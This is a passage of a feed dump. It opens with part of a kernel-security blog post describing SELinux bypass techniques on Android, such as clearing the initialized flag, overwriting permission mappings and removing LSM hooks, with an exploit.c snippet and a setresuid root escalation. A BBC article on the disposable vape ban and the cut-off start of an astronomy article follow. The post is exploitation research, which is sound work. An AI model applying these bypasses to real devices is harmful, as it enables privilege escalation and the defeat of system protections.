			 <span>u16</span> <span>orig_tclass</span><span>,</span>
			 <span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>,</span>
			 <span>struct</span> <span>extended_perms</span> <span>*</span><span>xperms</span><span>)</span>
<span>{</span>
	<span>[...]</span>
	<span>if</span> <span>(</span><span>!</span><span>selinux_initialized</span><span>(</span><span>state</span><span>))</span>
		<span>goto</span> <span>allow</span><span>;</span>
	<span>[...]</span>

<span>allow:</span>
	<span>avd</span><span>-&gt;</span><span>allowed</span> <span>=</span> <span>0xffffffff</span><span>;</span>
	<span>goto</span> <span>out</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><div file="security/selinux/include/security.h"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>static</span> <span>inline</span> <span>bool</span> <span>selinux_initialized</span><span>(</span><span>const</span> <span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>)</span>
<span>{</span>
	<span>/* do a synchronized load to avoid race conditions */</span>
	<span>return</span> <span>smp_load_acquire</span><span>(</span><span>&amp;</span><span>state</span><span>-&gt;</span><span>initialized</span><span>);</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>We can see that if <code>state-&gt;initialized</code> is not set, it allows every permission request. This field indicates if SELinux has been initialized and a policy has been loaded. It is set by <code>security_policy_commit()</code>, which is called by <code>sel_write_load()</code>, the write handler of <code>/sys/fs/selinux/load</code>.</p><p>If we have a memory write primitive, we can set <code>state-&gt;initialized</code> to false, bypassing every SELinux permission check. However, this leaves the system in an unstable state, because that field is checked in many other places, and setting it to false causes many features to not work. Therefore, it should be restored as soon as possible. <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf">Here</a>, similar to previous bypass, they use this to load a new policy, which already sets <code>state-&gt;initialized</code>.</p><p>Also, note that we are targeting <code>security_compute_av()</code>, and that function may not be called if the permission check is found in the cache. Therefore, it may also be needed to <a href="#bypass-3-overwrite-avc-cache">overwrite the cache</a>.</p><blockquote><p>On older Linux versions (4.14), field <code>state-&gt;initialized</code> corresponded to the global <code>ss_initialized</code>.</p></blockquote><blockquote><p>This doesn’t work on my Samsung device because <code>ss_initialized</code> is protected by the <a href="https://blog.longterm.io/samsung_rkp.html#selinux-initialization">hypervisor</a>.</p><div file="security/selinux/ss/services.c on Samsumg"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>#if (defined CONFIG_KDP_CRED &amp;&amp; defined CONFIG_SAMSUNG_PRODUCT_SHIP)
</span><span>int</span> <span>ss_initialized</span> <span>__kdp_ro_aligned</span><span>;</span>
<span>#else
</span><span>int</span> <span>ss_initialized</span><span>;</span>
<span>#endif
</span></pre></td></tr></tbody></table></code></p></div><p>Similarly, on my Huawei device that variable is also protected by the <a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection">hypervisor</a>.</p><div file="security/selinux/ss/services.c on Huawei"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>#ifdef CONFIG_HKIP_SELINUX_PROT
</span><span>int</span> <span>ss_initialized</span> <span>__wr</span><span>;</span>
<span>#else
</span><span>int</span> <span>ss_initialized</span><span>;</span>
<span>#endif
</span></pre></td></tr></tbody></table></code></p></div></blockquote><h3 id="bypass-5-overwrite-mapping"><span>Bypass 5: Overwrite mapping</span><a href="#bypass-5-overwrite-mapping"><i></i></a></h3><p>Function <code>security_compute_av()</code> calls <code>map_decision()</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td><pre><span>void</span> <span>security_compute_av</span><span>(</span><span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>,</span>
			 <span>u32</span> <span>ssid</span><span>,</span>
			 <span>u32</span> <span>tsid</span><span>,</span>
			 <span>u16</span> <span>orig_tclass</span><span>,</span>
			 <span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>,</span>
			 <span>struct</span> <span>extended_perms</span> <span>*</span><span>xperms</span><span>)</span>
<span>{</span>
	<span>struct</span> <span>selinux_policy</span> <span>*</span><span>policy</span><span>;</span>
	<span>struct</span> <span>policydb</span> <span>*</span><span>policydb</span><span>;</span>
	<span>[...]</span>

	<span>rcu_read_lock</span><span>();</span>
	<span>policy</span> <span>=</span> <span>rcu_dereference</span><span>(</span><span>state</span><span>-&gt;</span><span>policy</span><span>);</span>
	<span>[...]</span>
	<span>policydb</span> <span>=</span> <span>&amp;</span><span>policy</span><span>-&gt;</span><span>policydb</span><span>;</span>
	<span>[...]</span>

	<span>map_decision</span><span>(</span><span>&amp;</span><span>policy</span><span>-&gt;</span><span>map</span><span>,</span> <span>orig_tclass</span><span>,</span> <span>avd</span><span>,</span>
		     <span>policydb</span><span>-&gt;</span><span>allow_unknown</span><span>);</span>
<span>out:</span>
	<span>rcu_read_unlock</span><span>();</span>
	<span>return</span><span>;</span>
	<span>[...]</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>And as we can see in the following code, if <code>allow_unknown</code> is true and <code>mapping-&gt;perms[i]</code> is 0, then it sets that bit in <code>avd-&gt;allowed</code>, allowing that permission.</p><div file="security/selinux/ss/services.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td><pre><span>static</span> <span>void</span> <span>map_decision</span><span>(</span><span>struct</span> <span>selinux_map</span> <span>*</span><span>map</span><span>,</span>
			 <span>u16</span> <span>tclass</span><span>,</span> <span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>,</span>
			 <span>int</span> <span>allow_unknown</span><span>)</span>
<span>{</span>
	<span>if</span> <span>(</span><span>tclass</span> <span>&lt;</span> <span>map</span><span>-&gt;</span><span>size</span><span>)</span> <span>{</span>
		<span>struct</span> <span>selinux_mapping</span> <span>*</span><span>mapping</span> <span>=</span> <span>&amp;</span><span>map</span><span>-&gt;</span><span>mapping</span><span>[</span><span>tclass</span><span>];</span>
		<span>unsigned</span> <span>int</span> <span>i</span><span>,</span> <span>n</span> <span>=</span> <span>mapping</span><span>-&gt;</span><span>num_perms</span><span>;</span>
		<span>u32</span> <span>result</span><span>;</span>

		<span>for</span> <span>(</span><span>i</span> <span>=</span> <span>0</span><span>,</span> <span>result</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>n</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
			<span>if</span> <span>(</span><span>avd</span><span>-&gt;</span><span>allowed</span> <span>&amp;</span> <span>mapping</span><span>-&gt;</span><span>perms</span><span>[</span><span>i</span><span>])</span>
				<span>result</span> <span>|=</span> <span>1</span><span>&lt;&lt;</span><span>i</span><span>;</span>
			<span>if</span> <span>(</span><span>allow_unknown</span> <span>&amp;&amp;</span> <span>!</span><span>mapping</span><span>-&gt;</span><span>perms</span><span>[</span><span>i</span><span>])</span> <span>// &lt;--------</span>
				<span>result</span> <span>|=</span> <span>1</span><span>&lt;&lt;</span><span>i</span><span>;</span>
		<span>}</span>
		<span>avd</span><span>-&gt;</span><span>allowed</span> <span>=</span> <span>result</span><span>;</span>
		<span>[...]</span>
	<span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>We can abuse this to bypass SELinux by setting <code>policydb-&gt;allow_unknown</code> to true and filling <code>map.mapping[tclass].perms</code> with zeroes.</p><p>In Linux kernel 5.15, the <code>selinux_map</code>, which contains both the dynamically allocated array <code>mapping</code> indexed by class and its size, is at <code>&amp;selinux_state.policy-&gt;map</code>, and the <code>allow_unknown</code> is at <code>&amp;selinux_state.policy-&gt;policydb.allow_unknown</code>.</p><div file="security/selinux/ss/services.h"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td><pre><span>/* Mapping for a single class */</span>
<span>struct</span> <span>selinux_mapping</span> <span>{</span>
	<span>u16</span> <span>value</span><span>;</span> <span>/* policy value for class */</span>
	<span>unsigned</span> <span>int</span> <span>num_perms</span><span>;</span> <span>/* number of permissions in class */</span>
	<span>u32</span> <span>perms</span><span>[</span><span>sizeof</span><span>(</span><span>u32</span><span>)</span> <span>*</span> <span>8</span><span>];</span> <span>/* policy values for permissions */</span>
<span>};</span>

<span>/* Map for all of the classes, with array size */</span>
<span>struct</span> <span>selinux_map</span> <span>{</span>
	<span>struct</span> <span>selinux_mapping</span> <span>*</span><span>mapping</span><span>;</span> <span>/* indexed by class */</span>
	<span>u16</span> <span>size</span><span>;</span> <span>/* array size of mapping */</span>
<span>};</span>

<span>struct</span> <span>selinux_policy</span> <span>{</span>
	<span>struct</span> <span>sidtab</span> <span>*</span><span>sidtab</span><span>;</span>
	<span>struct</span> <span>policydb</span> <span>policydb</span><span>;</span>
	<span>struct</span> <span>selinux_map</span> <span>map</span><span>;</span>
	<span>u32</span> <span>latest_granting</span><span>;</span>
<span>}</span> <span>__randomize_layout</span><span>;</span>
</pre></td></tr></tbody></table></code></p></div><blockquote><p>On older versions (4.19), <code>policydb</code> and <code>map</code> were both embedded in a global variable <code>selinux_ss</code>. On even older versions (4.14), <code>policydb</code> was a global variable, and <code>map</code> corresponded to global variables <code>current_mapping</code> and <code>current_mapping_size</code>.</p></blockquote><p>Therefore, the bypass for 4.14 would look something like this:</p><div file="exploit.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>// Set policydb.allow_unknown to true</span>
<span>kwrite8</span><span>(</span><span>policydb_addr</span> <span>+</span> <span>OFFSET_ALLOW_UNKNOWN</span><span>,</span> <span>2</span><span>);</span>

<span>// Overwrite mapping so everything is unknown</span>
<span>uint64_t</span> <span>current_mapping_size</span> <span>=</span> <span>kread16</span><span>(</span><span>current_mapping_size_addr</span><span>);</span>
<span>uint64_t</span> <span>current_mapping</span> <span>=</span> <span>kread64</span><span>(</span><span>current_mapping_addr</span><span>);</span>
<span>uint8_t</span> <span>zeroes</span><span>[</span><span>FIELD_SIZEOF</span><span>(</span><span>struct</span> <span>selinux_mapping</span><span>,</span> <span>perms</span><span>)]</span> <span>=</span> <span>{};</span>
<span>for</span> <span>(</span><span>size_t</span> <span>tclass</span> <span>=</span> <span>0</span><span>;</span> <span>tclass</span> <span>&lt;</span> <span>current_mapping_size</span><span>;</span> <span>tclass</span><span>++</span><span>)</span> <span>{</span>
	<span>uint64_t</span> <span>mapping</span> <span>=</span> <span>current_mapping</span> <span>+</span> <span>tclass</span><span>*</span><span>sizeof</span><span>(</span><span>struct</span> <span>selinux_mapping</span><span>);</span>
	<span>kwrite</span><span>(</span><span>mapping</span> <span>+</span> <span>offsetof</span><span>(</span><span>struct</span> <span>selinux_mapping</span><span>,</span> <span>perms</span><span>),</span>
	       <span>zeroes</span><span>,</span> <span>sizeof</span><span>(</span><span>zeroes</span><span>));</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>The mapping is only modified when loading a new policy, so if we don’t reload the policy, we only need to do this once. But note that like the previous bypass, this targets <code>security_compute_av()</code>, and thus additionally it may be needed to <a href="#bypass-3-overwrite-avc-cache">overwrite the AVC cache</a> to remove cached denied permission requests.</p><p>This bypass was presented at <a href="https://www.blackhat.com/asia-24/briefings/schedule/#game-of-cross-cache-lets-win-it-in-a-more-effective-way-37742">Game of Cross Cache: Let’s Win It in a More Effective Way! </a>(slide 88) at Blackhat Asia 2024.</p><blockquote><p>This works on both my Samsung and my Huawei device. The memory of the mapping was not protected on either device.</p></blockquote><h3 id="bypass-6-remove-hooks"><span>Bypass 6: Remove hooks</span><a href="#bypass-6-remove-hooks"><i></i></a></h3><p>In <a href="https://www.iceswordlab.com/2018/04/20/samsung-root/#0x4-KNOX2-8-amp-amp-SELinux-%E5%9B%9E%E9%A1%B5%E9%A6%96">this post</a>, they bypass both SELinux and Samsung RKP (the Samsung hypervisor) by removing the security hooks. As explained <a href="#linux-security-module">previously</a>, SELinux hooks are added to the global <code>security_hook_heads</code>. This structure is defined as follows:</p><div file="include/linux/lsm_hooks.h"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>struct</span> <span>security_hook_heads</span> <span>{</span>
	<span>#define LSM_HOOK(RET, DEFAULT, NAME, ...) struct hlist_head NAME;
</span>	<span>#include</span> <span>"lsm_hook_defs.h"</span><span>
</span>	<span>#undef LSM_HOOK
</span><span>}</span> <span>__randomize_layout</span><span>;</span>
</pre></td></tr></tbody></table></code></p></div><div file="include/linux/lsm_hook_defs.h"><p><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>LSM_HOOK(int, 0, file_alloc_security, struct file *file)
LSM_HOOK(int, 0, file_open, struct file *file)
[...]
</pre></td></tr></tbody></table></code></p></div><p>It includes the <code>lsm_hook_defs.h</code>, which in this case defines a <code>struct hlist_head</code> for each type of hook.</p><blockquote><p>On older Linux versions (4.14), <code>security_hook_heads</code> defined a <code>struct list_head</code> instead of a <code>struct hlist_head</code> for each type of hook. So each hook list head took 16 bytes instead of 8.</p></blockquote><p>Modules call <code>security_add_hooks()</code> to add their own hook functions to each list. Therefore, if we could modify the global <code>security_hook_heads</code> and its lists, it may be possible to remove hooks to bypass SELinux.</p><p>There is one problem: this structure is declared as <code>__lsm_ro_after_init</code>, which means it is marked as read-only after init. A regular memory write primitive won’t work.</p><div file="security/security.c"><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>struct</span> <span>security_hook_heads</span> <span>security_hook_heads</span> <span>__lsm_ro_after_init</span><span>;</span>
</pre></td></tr></tbody></table></code></p></div><p>However, if there is no hypervisor, there are ways to write to read-only memory. First, if we have a physical memory write primitive we can just write to it, as it writes to the underlying physical memory, ignoring virtual memory protections. Otherwise, if we have a virtual memory write primitive, we could modify the protections of that page by modifying the kernel page table (<code>swapper_pg_dir</code>), or maybe map that page to another virtual address with read-write permissions.</p><p>On the other side, if there is a hypervisor underneath, it may not be possible to write to read-only memory from the kernel. This is because the physical address obtained from the kernel page tables is actually an Intermediate Physical Address (IPA), which may be mapped to the real physical address as read-only in the second stage page tables in the hypervisor, as explained <a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#arm-virtualization-extensions">here</a> and <a href="https://blog.longterm.io/samsung_rkp.html#hypervisor-crash-course">here</a>.</p><blockquote><p>Truth is, I have managed to write to <code>security_hook_heads</code> on both my Samsung and Huawei devices, which supposedly protect read-only memory from the hypervisor. On my Samsung device, I believe it is because they don’t protect “read-only after init” memory, as they don’t do any call to the hypervisor from <code>mark_rodata_ro()</code>, the function in charge of changing permissions of <code>__ro_after_init</code> memory to read-only. On my Huawei device, they did modify <code>mark_rodata_ro()</code> to perform hypercalls to also mark that memory as read-only in the second stage page tables, as shown <a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#kernel-read-only-data">here</a>. However, I believe the memory write primitive I was using in my test exploit bypasses this because memory access is performed from the GPU, instead of from the CPU. This may have been patched on more modern devices.</p></blockquote><p>Even when we can write to read-only memory, one must be careful when modifying <code>security_hook_heads</code>. Just emptying every list and removing every hook didn’t work for me. It crashed with some NULL point deref because of a hook accessing a NULL <code>security</code> field. However, I believe by removing the correct hooks, it’s possible to get a stable SELinux bypass, as the post explains.</p><p>Note this can also be used to perform privilege escalation. Syscall <code>setresuid()</code> checks permissions with <a href="https://elixir.bootlin.com/linux/v5.15.41/source/kernel/sys.c#L680"><code>ns_capable_setid()</code></a>, which ends up calling <code>security_capable()</code>, which simply calls the hook <code>capable</code>. So if we empty the list <code>security_hook_heads.capable</code>, then those permission checks won’t be performed, and we can just do <code>setresuid(0, 0, 0)</code> to get root. Something similar is implemented <a href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/dac_bypass.c">here</a> by chompie1337.</p><blockquote><p>In theory, this shouldn’t work on my Samsung and Huawei devices, because they have some methods to detect privilege escalations and abort them. However, my Huawei device fails to detect this privilege escalation. I believe this is because, as shown <a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#privilege-escalation-detection">here</a>, it stores a protected bitmap indicating if each process is root or not. Then, at certain points, it calls <code>hkip_check_xid_root()</code> to check if the task is now root but wasn’t before according to the bitmap, and kills it in that case. However, that bitmap is updated with <code>hkip_update_xid_root()</code> from <code>commit_creds()</code>, which is <a href="https://elixir.bootlin.com/linux/v5.15.41/source/kernel/sys.c#L715">called</a> from syscall <code>setresuid()</code>. So if we manage to bypass the permission checks present by default in that syscall as we are doing by overwriting <code>security_hook_heads.capable</code>, then the hypervisor will happily update the bitmap and allow the privilege escalation. Similarly, this privilege escalation method also worked on my Samsung device, but I didn’t further explore the reasons why Samsung DEFEX failed.</p></blockquote><h2 id="conclusion"><span>Conclusion</span><a href="#conclusion"><i></i></a></h2><p>I hope you enjoyed the post and learnt something new. Please don’t hesitate to contact me if you see something wrong or for any question or clarification. Happy hacking!</p><h2 id="references"><span>References</span><a href="#references"><i></i></a></h2><ol><li><a href="https://docs.kernel.org/security/lsm.html#lsm-framework">Linux Security Modules</a></li><li><a href="https://source.android.com/docs/security/features/selinux/concepts#types_attributes_rules">SELinux types, attributes and rules</a></li><li><a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection">SELinux protection on Huawei devices (from Shedding Light on Huawei’s Security Hypervisor, by Impalabs)</a></li><li><a href="https://blog.longterm.io/samsung_rkp.html#selinux-initialization">SELinux protection on Samsung devices (from A Samsung RKP Compendium, by Longterm Security)</a></li><li><a href="https://www.iceswordlab.com/2018/04/20/samsung-root/#0x4-KNOX2-8-amp-amp-SELinux-%E5%9B%9E%E9%A1%B5%E9%A6%96">Samsung KNOX and SELinux (from How to root Samsung S8 using a race vulnerability, by IceSword Lab)</a></li><li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf">Defeating Samsung KNOX with zero privilege (by Keen Security Lab)</a></li></ol></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Disposable vapes to be banned in England and Wales (144 pts)]]></title>
            <link>https://www.bbc.com/news/articles/cd7n3zyp114o</link>
            <guid>41946401</guid>
            <pubDate>Fri, 25 Oct 2024 15:48:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.com/news/articles/cd7n3zyp114o">https://www.bbc.com/news/articles/cd7n3zyp114o</a>, See on <a href="https://news.ycombinator.com/item?id=41946401">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><figure><div data-component="image-block"><p><img src="https://www.bbc.com/bbcx/grey-placeholder.png"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/f011/live/78234a20-9212-11ef-b047-4d31578ee4d2.jpg.webp" loading="eager" alt="EPA-EFE/REX/Shutterstock A young woman wearing a tracksuit top, Prada sunglasses and Airpods uses a blue-coloured disposable vape on a London street"><span>EPA-EFE/REX/Shutterstock</span></p></div><p data-component="caption-block"><figcaption>The government plans to introduce legislation to ban the sale of disposable vapes from 1 June 2025<!-- --></figcaption></p></figure><div data-component="text-block"><p>The sale of single-use disposable vapes will be banned in England and Wales from June next year, the government has confirmed. <!-- --></p><p>Ministers in England said the move, first announced in January by the previous government but not enacted before the general election, is intended to protect children's health and prevent environmental damage.<!-- --></p><p>The government said it had worked closely with the devolved nations and they would "align coming into force dates" on bans, with Wales <!-- --><a target="_self" href="https://www.bbc.co.uk/news/articles/c7043578863o">already confirming it will follow suit<!-- --></a>.<!-- --></p><p>Vaping industry leaders have warned the move could fuel a rise in illegal sales of the products. <!-- --></p></div><div data-component="text-block"><p>Single-use vapes had been due to be banned in Scotland from April of next year - but the Scottish government has said the ban <!-- --><a target="_self" href="https://www.bbc.co.uk/news/articles/cp8x1gyg0lro">will now be delayed until 1 June<!-- --></a> to align with England and Wales.<!-- --></p><p>The Department for Environment, Food, and Rural Affairs (Defra) said vape usage in England had grown by more than 400% between 2012 and 2023, with 9% of the British public now buying and using the products.<!-- --></p><p>The number of people who vape <!-- --><a target="_self" href="https://www.bbc.co.uk/news/articles/c20jeey047xo">without ever having smoked has also increased<!-- --></a> considerably over recent years, driven mostly by young adults.<!-- --></p><p>It is illegal to sell any vape to anyone under 18, but disposable vapes - often sold in smaller, more colourful packaging than refillable ones - are a "key driver behind the alarming rise in youth vaping", the previous government said <!-- --><a target="_self" href="https://www.bbc.co.uk/news/uk-68123202">when it first set out its plan<!-- --></a>.<!-- --></p><p>Public health minister Andrew Gwynne said banning disposables would "reduce the appeal of vapes to children and keep them out of the hands of vulnerable young people".<!-- --></p><p>Vaping is substantially less harmful than smoking, but it has not been around for long enough for its long-term risks to be known, according to the NHS.<!-- --></p></div><figure><div data-component="image-block"><p><img src="https://www.bbc.com/bbcx/grey-placeholder.png"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/3ecb/live/b7460a60-91ba-11ef-9a7d-071f318c341c.jpg.webp" loading="lazy" alt="Getty Images A stock image shows an assortment of disposable vapes strewn on a pink surface"><span>Getty Images</span></p></div><p data-component="caption-block"><figcaption>The previous government said disposable vapes were a "key driver" behind a rise in youth vaping<!-- --></figcaption></p></figure><div data-component="text-block"><p>The ban will not apply to rechargeable or refillable devices. <!-- --></p><p>Single-use vapes are difficult to recycle and typically end up in landfill, where their batteries can leak harmful waste like battery acid, lithium, and mercury into the environment, the government said. <!-- --></p><p>Batteries thrown into household waste also cause <!-- --><a target="_self" href="https://www.bbc.co.uk/news/science-environment-63809620">hundreds of fires<!-- --></a> in bin lorries and waste-processing centres every year. <!-- --></p><p>Defra estimates almost five million single-use vapes were either littered or thrown into general waste each week last year, a nearly four-fold increase on the year before.<!-- --></p><p>In 2022, vapes were discarded containing a total of more than 40 tonnes of lithium, enough to power 5,000 electric vehicles, it said.<!-- --></p><p>Defra minister Mary Creagh, whose role focuses on reducing waste in the economy, said disposable vapes were "extremely wasteful and blight our towns and cities".<!-- --></p></div><div data-component="text-block"><p>Paediatric respiratory consultant Dr Claire Hogg told BBC Radio 5 Live that disposables had "lead to an absolute epidemic of nicotine addiction and a group of children... who are having disrupted sleep, disrupted concentration and really struggling with problems with addiction".<!-- --></p><p>She said her son had previously vaped and thought the ban was "brilliant news" as he had been "addicted to nicotine through false marketing" since he was around 14-years-old.<!-- --></p></div><div data-component="text-block"><p>Disposable vapes - often priced at about £5 - are usually cheaper upfront than many refillable vape kits - often priced at about £8-12 - and can be bought from non-specialist retailers.<!-- --></p><p>But the long-term costs associated with refillable kits are lower than for disposables.<!-- --></p><p>Ireland and Belgium have recently outlined plans to ban the products, while countries including New Zealand, Australia, South Korea, India and Brazil already have restrictions in place.<!-- --></p></div><p data-component="subheadline-block"><h2>'Black market'<!-- --></h2></p><div data-component="text-block"><p>John Dunne, director general of the UK Vaping Industry Association, told BBC Radio 4's Today programme that a ban would "fuel" illegal sales.<!-- --></p><p>"We have a black market in vaping products already that the authorities can't really keep up [with], so now this is going to be dropped right on their lap as well," he said.<!-- --></p><p>Mr Dunne said the association had called on the government to alternatively introduce a licensing scheme for retailers and distributors of the products, "which will include things like mandatory age verification processes".<!-- --></p><p>The government plans to introduce legislation to ban the sale of single-use vapes from 1 June 2025, allowing retailers time to sell their remaining stock. It will cover all single-use vapes, regardless of where they are imported from.<!-- --></p><p>Online shops and major retailing platforms will be expected to use "online takedown procedures" to stop illicit suppliers when the ban comes into force, the department for health and social care said.<!-- --></p><p>The devolved governments have previously announced an intention to bring in similar bans, and the UK government said it was working with them to align the dates on which the bans come into force. <!-- --></p><p>Welsh Deputy First Minister Huw Irranca-Davies said introducing the bans on the same date across the nations would enable "high levels of compliance and consistent approach to enforcement across the UK".<!-- --></p><p>The measure is separate from government plans to end smoking by banning the sale of cigarettes to anyone born after January 2009. <!-- --></p><p>Health Secretary Wes Streeting said on Monday a bill to enact that ban would be introduced to parliament before Christmas. <!-- --></p></div><!--$!--><!--/$--></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Astronomers discover complex carbon molecules in interstellar space (113 pts)]]></title>
            <link>https://www.sciencealert.com/astronomers-discover-complex-carbon-molecules-in-interstellar-space</link>
            <guid>41946381</guid>
            <pubDate>Fri, 25 Oct 2024 15:46:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sciencealert.com/astronomers-discover-complex-carbon-molecules-in-interstellar-space">https://www.sciencealert.com/astronomers-discover-complex-carbon-molecules-in-interstellar-space</a>, See on <a href="https://news.ycombinator.com/item?id=41946381">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			<p>A team led by researchers at MIT in the United States has discovered large molecules containing carbon in a distant interstellar cloud of gas and dust.</p><p>This is exciting for those of us who keep lists of <a href="https://en.wikipedia.org/wiki/List_of_interstellar_and_circumstellar_molecules#">known interstellar molecules</a> in the hope that we might work out how life arose in the Universe.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>But it's more than just another molecule for the collection. The result, reported <a href="http://www.science.org/doi/10.1126/science.adq6391">today in the journal <em>Science</em></a>, shows that complex organic molecules (with carbon and hydrogen) likely existed in the cold, dark gas cloud that gave rise to our Solar System.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>Furthermore, the molecules held together until after the formation of Earth. This is important for our understanding of the early origins of life on our planet.</p><!-- START single/mrec -->
<!-- END single/mrec --><h2>Difficult to destroy, hard to detect</h2><p>The molecule in question is called pyrene, a polycyclic aromatic hydrocarbon or PAH for short. The complicated-sounding name tells us these molecules are made of rings of carbon atoms.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>Carbon chemistry is the backbone of life on Earth. PAHs have long been known to be abundant in the interstellar medium, <a href="https://www.space.com/asteroid-ryugu-samples-origins-life-cold">so they feature prominently</a> in theories of how carbon-based life on Earth came to be.</p><figure><a href="https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=1000&amp;fit=clip"><img decoding="async" alt="A diagram of four interconnected eight-point rings with white points along the outer edge." src="https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=237&amp;fit=clip" srcset="https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=600&amp;h=461&amp;fit=crop&amp;dpr=1 600w, https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=30&amp;auto=format&amp;w=600&amp;h=461&amp;fit=crop&amp;dpr=2 1200w, https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=15&amp;auto=format&amp;w=600&amp;h=461&amp;fit=crop&amp;dpr=3 1800w, https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=754&amp;h=580&amp;fit=crop&amp;dpr=1 754w, https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=30&amp;auto=format&amp;w=754&amp;h=580&amp;fit=crop&amp;dpr=2 1508w, https://images.theconversation.com/files/627841/original/file-20241024-19-pov7ml.png?ixlib=rb-4.1.0&amp;q=15&amp;auto=format&amp;w=754&amp;h=580&amp;fit=crop&amp;dpr=3 2262w" sizes="(min-width: 1466px) 754px, (max-width: 599px) 100vw, (min-width: 600px) 600px, 237px" loading="lazy"></a><figcaption>A pyrene molecule, consisting of carbon atoms (black) and hydrogen atoms (white). (<a 